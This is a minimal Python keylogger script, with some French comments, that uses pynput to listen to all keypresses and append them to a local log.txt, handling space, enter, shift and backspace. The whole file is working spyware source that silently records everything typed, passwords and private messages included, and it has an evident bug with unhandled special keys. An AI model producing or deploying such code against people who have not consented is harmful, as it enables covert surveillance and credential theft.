#r= reading, w=write a=apending
#import
from pynput.keyboard import Listener,Key
def writetofile(key):
    try:
        keydata=key.char
    except AttributeError:
        if key==Key.space:
            keydata= " "
        if key==Key.shift_r:
            keydata= ""
        if key==Key.backspace:
            with open('log.txt', 'rb+') as f:
                    f.seek(0, 2)  # aller à la fin
                    size = f.tell()
                    if size > 0:
                        f.truncate(size - 1)
            return
        if key==Key.shift:
            keydata= ""
        if key==Key.enter:
            keydata= "\n"
   
    with open('log.txt', 'a',encoding='utf-8') as f:
        f.write(keydata)

with Listener(on_press=writetofile) as l:
    l.join()

